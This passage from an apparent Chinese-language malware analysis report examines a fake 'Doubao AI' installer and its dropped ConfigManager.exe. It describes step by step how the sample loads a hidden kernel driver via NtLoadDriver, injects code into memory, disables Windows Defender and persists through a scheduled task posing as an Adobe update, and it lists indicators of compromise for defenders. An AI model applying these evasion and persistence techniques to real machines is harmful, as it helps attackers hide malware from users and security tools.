![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/53e30e5e00ae14a1.png)

调用 sub_140005D50函数写入驱动文件内容

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ae4ea2ddcea3759c.png)

创建服务注册表项并调用NtLoadDriver 加载驱动服务

注册表路径：HKLM\\SYSTEM\\CurrentControlSet\\Services\\

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c6f89815caa5ddf6.png)

完整功能如下：

```plain
### 1. 生成随机名称
- 调用 sub_140005A60 生成两个随机字符串：
  - 8字符的服务名（存储在 byte_14003A668 ）
  - 8字符的文件名前缀
### 2. 构造驱动文件路径
- 获取临时目录路径（ GetTempPathA ）
- 构造完整路径： %Temp%\8位随机字母.sys
### 3. 写入驱动文件
- 调用 sub_140005D50(Str) 写入驱动文件内容
- 驱动文件内容可能存储在程序的资源段或其他内存区域
### 4. 创建服务注册表项
- 在 HKLM\SYSTEM\CurrentControlSet\Services\{服务名} 创建注册表项
- 设置服务参数：
  - Type = 1（驱动服务）
  - Start = 3（手动启动）
  - ErrorControl = 0（忽略错误）
  - ImagePath = 驱动文件完整路径
### 5. 加载驱动
- 调用 NtLoadDriver 加载驱动服务
- 检查加载是否成功
### 6. 清理操作
- 删除临时目录中的驱动文件（ DeleteFileA ）
- 失败时使用备选删除方法（ sub_140005ED0 ）
- 如果驱动加载失败，删除服务注册表项
```

释放的驱动文件要进入安全模式才能删除查看

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a4fed63784ee0e84.png)

#### 代码注入

sub_140001C40函数主要功能如下：

```plain
- 内存分配 ：使用 VirtualAlloc （通过 qword_14003A520 ）分配可执行内存
- 代码写入 ：使用 WriteProcessMemory （通过 qword_14003A538 ）写入注入的代码
- 内存保护 ：使用 VirtualProtect （通过 qword_14003A528 ）修改内存保护属性
- 线程创建 ：使用 CreateThread 创建线程执行注入的代码
- 内存清理 ：执行完成后清理注入的代码
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8e6cd554520f95fb.png)

### 动态行为监控

禁用 Windows Defender 和安全中心

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1b54ec4259c58af1.png)

在下C:\\Users\\{user}\\AppData\\Roaming\\B2D6568600009934\\目录下写入多个文件

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/45814f73fb43dada.png)

修改 Internet Explorer 安全区域设置

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ce0289e5d716a42e.png)

释放并尝试安装内核驱动

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/09fe4c4a4c625907.png)

创建计划任务AdobeAcrobatUpdate-8776

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e991ea8a7d25ec17.png)

在C:\\Windows\\System32\\Tasks目录找到对应的文件

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/35fb99faf0ffc38a.png)

AdobeAcrobatUpdate-8776文件内容对应ConfigManager.exe

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6fc451c3386ed03e.png)

网络通信行为

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5874ef08cd3731b5.png)

### 流程图

#### ConfigManager.exe运行流程图

ConfigManager.exe运行流程图如下：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ded3e0cac6436db0.png)

#### 简化版的整体流程图

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1b4c2979a79cce8b.png)

## IoC 指标汇总

### 文件哈希

|     |     |     |
| --- | --- | --- |  
| 样本  | 算法  | 值   |
| doubaoai-app.exe | SHA256 | `b18e6df04b25b7f15e2ffb884315cc25abb0ff84ca30c6382543f9e4ae9243a3` |
| doubaoai-app.exe | MD5 | `b29624864550b151143c6a461ba6288d` |
| doubaoai-app.exe | SHA1 | `c227d58ec808a27ff372b2e031e1ec5e6fd402bc` |
| ConfigManager.exe | SHA256 | `0b901dcc4f13f0ddc65e886ca59fac64c78f9381cb0f27e80414773c263371af` |
| ConfigManager.exe | MD5 | `e36064a805db9c95199814265a7f2225` |
| ConfigManager.exe | SHA1 | `2cbd8ff50297bd100ee4892503ac7870c7a7b9a8` |

### 域名 / URL

|     |     |     |
| --- | --- | --- |  
| 类型  | 域名  | 说明  |
| 仿冒（恶意） | `doubao-app.com` | 含连字符，非字节跳动官方域 |
| 仿冒（恶意） | `doubao-zh.hl.cn` | `hl.cn` 非字节跳动持有 |
| 官方（对照） | `doubao.com` | 真实豆包主域；攻击者借其名称"沾光" |

> 真实豆包官方域为 `doubao.com` （及 `doubao.com` 下的标准路径）。任何 `doubao-app.com` 、 `doubao-zh.*` 等变体均为仿冒。

### 文件系统痕迹

|     |     |
| --- | --- | 
| 路径  | 说明  |
| `C:\Users\{用户}\AppData\Local\Temp\ConfigManager.exe` | 落地释放的二级样本 |
| `C:\Users\{用户}\AppData\Local\Temp\Doubao_installer_2.1.8.exe` | 诱导的"安装程序"（被访问） |
| `C:\Users\{用户}\AppData\Local\Temp\{8位随机}.sys` | 释放的内核驱动（需安全模式删除） |
| `C:\Users\{用户}\AppData\Roaming\B2D6568600009934\` | 样本写入的数据/模块目录 |
| `C:\Windows\System32\Tasks\AdobeAcrobatUpdate-8776` | 计划任务文件 |
| `C:\Windows\System32\Tasks\AdobeAcrobatUpdate-F130` | 计划任务文件（变体） |

### 注册表 / 持久化

|     |     |
| --- | --- | 
| 位置  | 说明  |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` | 禁用 Defender 策略 |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows\safer\codeidentifiers` | 软件限制策略（可能被用于放行/规避） |
| `HKLM\SYSTEM\CurrentControlSet\Services\{8位随机}` | 内核驱动服务项（Type=1, Start=3） |
| `HKLM\SOFTWARE\Classes\.exe` / `exefile` | 文件关联查询 |
| `HKU\...\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer` | 用户 Explorer 配置 |
